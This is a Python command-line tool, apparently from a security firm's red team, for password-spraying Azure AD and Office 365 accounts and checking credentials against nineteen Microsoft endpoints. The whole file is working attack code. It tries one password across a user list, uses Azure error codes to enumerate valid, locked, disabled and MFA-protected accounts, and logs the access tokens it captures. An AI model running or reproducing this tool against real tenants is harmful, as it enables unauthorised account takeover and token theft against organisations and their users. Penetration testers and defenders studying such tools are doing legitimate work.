#!/usr/bin/env python3
import adal
import sys
import datetime

black = lambda text: '\033[0;30m' + text + '\033[0m'
red = lambda text: '\033[1;31m' + text + '\033[0m'
green = lambda text: '\033[1;32m' + text + '\033[0m'
yellow = lambda text: '\033[1;33m' + text + '\033[0m'
blue = lambda text: '\033[0;34m' + text + '\033[0m'
magenta = lambda text: '\033[0;35m' + text + '\033[0m'
cyan = lambda text: '\033[0;36m' + text + '\033[0m'
white = lambda text: '\033[0;37m' + text + '\033[0m'

# Azure error codes: https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes
# Endpoint list: https://github.com/Gerenios/AADInternals/blob/master/AccessToken_utils.ps1
# More endpoints: https://www.shawntabrizi.com/aad/common-microsoft-resources-azure-active-directory/

endpoint_table = [
	[1, "aad_graph_api", "https://graph.windows.net"],
	[2, "ms_graph_api", "https://graph.microsoft.com"],
	[3, "azure_mgmt_api", "https://management.azure.com"],
	[4, "windows_net_mgmt_api", "https://management.core.windows.net"],
	[5, "cloudwebappproxy", "https://proxy.cloudwebappproxy.net/registerapp"],
	[6, "officeapps", "https://officeapps.live.com"],
	[7, "outlook", "https://outlook.office365.com"],
	[8, "webshellsuite", "https://webshell.suite.office.com"],
	[9, "sara", "https://api.diagnostics.office.com"],
	[10, "office_mgmt", "https://manage.office.com"],
	[11, "msmamservice", "https://msmamservice.api.application"],
	[12, "spacesapi", "https://api.spaces.skype.com"],
	[13, "datacatalog", "https://datacatalog.azure.com"],
	[14, "database", "https://database.windows.net"],
	[15, "AzureKeyVault", "https://vault.azure.net"],
	[16, "onenote", "https://onenote.com"],
	[17, "o365_yammer", "https://api.yammer.com"],
	[18, "skype4business", "https://api.skypeforbusiness.com"],
	[19, "o365_exchange", "https://outlook-sdf.office.com"]
	]

def main():
	if len(sys.argv) == 1:
		help_menu()
		exit()
	if sys.argv[1] == 'spray':
		ascii_art()
		spray()
	elif sys.argv[1] == 'validate' and len(sys.argv) == 4:
		ascii_art()
		validate()
	else:
		help_menu()

def ascii_art():
	print()
	print()
	print(yellow('  ------------------------------------------------------------'))
	print(yellow(" |    ;---<<<<,___________//_________________________________ |"))
	print(yellow(" |   _|_     /        /  ____/  ____/  __ /  __ / __  /  /  / |"))
	print(yellow(" |  /   \\   /  /  /  /____  /____  /  ___/   __/     / \\   /  |"))
	print(yellow(" |  |   |  /__/__/__/______/______/__/  /__/\\_\\__/__/  /__/   |"))
	print(yellow(" |  |___|             //                                      |"))
	print(yellow("  ------------------------------------------------------------"))
	print()
	print(green(" Tool          :: Password attacks and MFA validation against various endpoints in Azure and Office 365"))
	print(green(" Author        :: Walker Hines (@__TexasRanger)"))
	print(green(" Credits       :: Dan Astor (@illegitimateDA)"))
	print(green(" Company       :: Security Risk Advisors"))
	print(green(" Version       :: 1.0"))
	print()
	print("  ------------------------------------------------------------")

def spray():
	stop_on_success = False

	if len(sys.argv) != 5 and len(sys.argv) != 6:
		help_menu()
		exit()

	if len(sys.argv) == 6:
		if sys.argv[5] == "stop":
			stop_on_success = True

	user_file = open(sys.argv[2])
	user_list = user_file.readlines()
	user_file.close()
	spray_password = sys.argv[3]

	endpoint = endpoint_table[int(sys.argv[4]) - 1][2]

	token_list = []
	successful_user_list = []

	user_count = len(user_list)
	date_time = datetime.datetime.now()
	file_name = date_time.strftime("msspraylogs_" + "%m-%d-%y-%X.txt")
	file_name = file_name.replace(":", "-")
	error_log = open(file_name, "w+")
	spray_position = 1

	print()
	print(yellow("Spraying endpoint " + endpoint + " with " + str(len(user_list)) + " users\n"))
	error_log.write("Spraying endpoint " + endpoint + " with " + str(len(user_list)) + " users\n\n")
	lockout_count = 0
	ignore_lockout = False

	for user in user_list:
		token = None
		context = None
		result = ''
		result_clean = ''
		error = ''
		context = adal.AuthenticationContext('https://login.microsoftonline.com/common', api_version=None, proxies=None, verify_ssl=True)
		user_formatted = user.replace('\n', '')
		user_formatted = user_formatted.replace('\r', '')
		print(yellow("[" + str(spray_position) + "/" + str(user_count) + "]") + "User: " + user_formatted + " | ", end ="")
		error_log.write("[" + str(spray_position) + "/" + str(user_count) + "]User: " + user_formatted + "\n")
		try:
			token = context.acquire_token_with_username_password(endpoint, user_formatted, spray_password, '1b730954-1685-4b74-9bfd-dac224a7b894')
			if token is not None:
				lockout_count = 0
				result = green("Success!")
				result_clean = "Success!"
				error = "None"
				successful_user_list.append(user_formatted)
				token_list.append(token)
				if stop_on_success == True:
					print(result + "\n")
					error_log.write("Result: " + result_clean + "\n")
					error_log.write("Azure Error Code: " + error + "\n\n")
					user_count = spray_position
					break

		except adal.adal_error.AdalError as e:
			if "WS-Trust RST request" in str(e):
				lockout_count = 0
				result = red("Failed")
				result_clean = "Failed"
				error = str(e)
			elif "Server returned an unknown AccountType: unknown" in str(e):
				lockout_count = 0
				result = red("Invalid Domain, check for typo")
				result_clean = "Invalid Domain, check for typo"
				error = str(e)
			elif "Server returned error in RSTR" in str(e):
				lockout_count = 0
				result = red("Invalid Account")
				result_clean = "Invalid Account"
				error = str(e)
			elif "User Realm Discovery request" in str(e):
				lockout_count = 0
				result = red("Poorly formatted username")
				result_clean = "Poorly formatted username"
				error = str(e)
			else:
				error_code = e.error_response['error_codes'][0]
				error_description = e.error_response['error_description']
				tmp = error_description.split("\n")[0]
				if error_code == 50076:
					result = yellow("Success: MFA Required")
					result_clean = "Success: MFA Required"
					sul = user_formatted + " - MFA Required"
					lockout_count = 0
					successful_user_list.append(sul)
					error = tmp
				elif error_code == 50158:
					result = yellow("Probable Success: External security challenge not satisfied, likely a conditional access policy")
					result_clean = "Probable Success: External security challenge not satisfied, likely a conditional access policy"
					sul = user_formatted + " - Conditional Access Policy in place"
					lockout_count = 0
					successful_user_list.append(sul)
					error = tmp
				elif error_code == 50053:
					result = yellow("Success: Account Locked")
					result_clean = "Success: Account Locked"
					sul = user_formatted + " - Account Locked"
					lockout_count = lockout_count + 1
					successful_user_list.append(sul)
					error = tmp
				elif error_code == 50057:
					result = yellow("Success: Account Disabled")
					result_clean = "Success: Account Disabled"
					lockout_count = 0
					sul = user_formatted + " - Account Disabled"
					successful_user_list.append(sul)
					error = tmp
				elif error_code == 50055:
					result = yellow("Success: Password Expired")
					lockout_count = 0
					result_clean = "Success: Password Expired"
					sul = user_formatted + " - Password Expired"
					successful_user_list.append(sul)
					error = tmp
				elif error_code == 50034:
					result = red("Failed: Account does not exist in directory")
					lockout_count = 0
					result_clean = "Failed: Account does not exist in directory"
					error = tmp
				else:
					result = red("Failed")
					lockout_count = 0
					result_clean = "Failed"
					error = tmp
			if lockout_count > 5 and ignore_lockout == False:
				result = "Too many lockouts in a row suggests your spray may have been blocked"
				queryUser = input("Too many lockout errors in a row suggests your spray may have been blocked, do you want to continue? (y/N): ")
				if queryUser == "y":
					lockout_count = 0
					ignore_lockout = True
				else:
					user_count = spray_position
					break

		spray_position = spray_position + 1
		print(result + "\n")
		error_log.write("Result: " + result_clean + "\n")
		error_log.write("Azure Error Code: " + error + "\n\n")
	error_log.write("\n\n")
	error_log.write("Tokens gained: \n")
	for t in token_list:
		error_log.write(str(t) + "\n")
	error_log.close()
	print(yellow("Total Users Sprayed: " + str(user_count) + "\n"))
	print(yellow("Successful Logins: " + str(len(token_list))))
	print(yellow("---------------------------------------------"))
	for s in successful_user_list:
		print(green(s))
	print("\n")
	print("Logs of this spray including detailed error codes and tokens have been written to: " + file_name + "\n")

def validate():
	
	date_time = datetime.datetime.now()
	file_name = date_time.strftime("validationlog_" + "%m-%d-%y-%X.txt")
	file_name = file_name.replace(":", "-")

	token_list = []
	validation_log = open(file_name, "w+")
	username = sys.argv[2]
	password = sys.argv[3]
	print(yellow("Checking all endpoints with account: " + username + "\n"))
	validation_log.write("Checking all endpoints with account: " + username + "\n\n")
	log_result = ''

	for entry in endpoint_table:
		endpoint = entry[2]
		error = ''
		result = ''
		token = None
		context = None
		context = adal.AuthenticationContext("https://login.microsoftonline.com/common", api_version=None, proxies=None, verify_ssl=True)
		try:
			token = context.acquire_token_with_username_password(endpoint, username, password, '1b730954-1685-4b74-9bfd-dac224a7b894')
			if token is not None:
				result = green('Successful login')
				log_result = 'Successful login'
				error = "None"
				token_list.append(token)
		except adal.adal_error.AdalError as e:
			try:
				error_code = e.error_response['error_codes'][0]
				error_description = e.error_response['error_description']
				tmp = error_description.split("\n")[0]
				if error_code == 50076:
					result = yellow("Success: MFA Required")
					log_result = "Success: MFA Required"
					error = tmp
				elif error_code == 50158:
					result = yellow("Probable Success: External security challenge not satisfied, likely a conditional access policy")
					log_result = "Probable Success: External security challenge not satisfied, likely a conditional access policy"
					error = tmp
				elif error_code == 50053:
					result = yellow("Success: Account Locked")
					log_result = "Success: Account Locked"
					error = tmp
				elif error_code == 50057:
					result = yellow("Success: Account Disabled")
					log_result = "Success: Account Disabled"
					error = tmp
				elif error_code == 50055:
					result = yellow("Success: Password Expired")
					log_result = "Success: Password Expired"
					error = tmp
				else:
					result = red("Failed")
					log_result = "Failed"
					error = tmp
			except TypeError as f:
				result = str(e)
		print("Endpoint: " + endpoint)
		print(result + "\n")
		validation_log.write("Endpoint: " + endpoint + "\n\t" + "Result: " + log_result + "\n\tError Message: " + error + "\n\n")
	for t in token_list:
		validation_log.write("Token: " + str(t) + "\n\n")
	print("Log of endpoint authorization attempts written to: " + file_name + "\n")
	validation_log.close()


def help_menu():
	print("----------------------------------------------------------------------------------------------------------------------")
	print("Usage:\n")
	print(("Perform a password spray against the <endpoint_selection> with supplied <userfile> and <password> with the option to stop on success <stop>: "))
	print(yellow("  python3 msspray.py spray <userfile> <password> <endpoint_selection> <stop/blank>"))
	print(("\nCheck each endpoint for authentication with a valid <username> and <password>: "))
	print(yellow("  python3 msspray.py validate <username> <password>\n"))
	print("----------------------------------------------------------------------------------------------------------------------")
	print("Endpoints (Default is [1]): \n")
	print("  {:<6} {:<20} {:<50}\n".format('Number', 'Name', 'Endpoint'))
	for entry in endpoint_table:
		print(green("  {:<6} {:<20} {:<50}".format("["+str(entry[0])+"]", entry[1], entry[2])))
	print("----------------------------------------------------------------------------------------------------------------------")
	print("Examples: \n")
	print(yellow("  python3 msspray.py spray users.txt Spring2020 1 stop #spray against https://graph.windows.net, stopping on first successful login\n"))
	print(yellow("  python3 msspray.py spray users.txt Spring2020 4 #spray against https://management.core.windows.net\n"))
	print(yellow("  python3 msspray.py validate bill.smith@sra.io ReallyBadPass #check all endpoints using valid account\n"))
	print("----------------------------------------------------------------------------------------------------------------------")


main()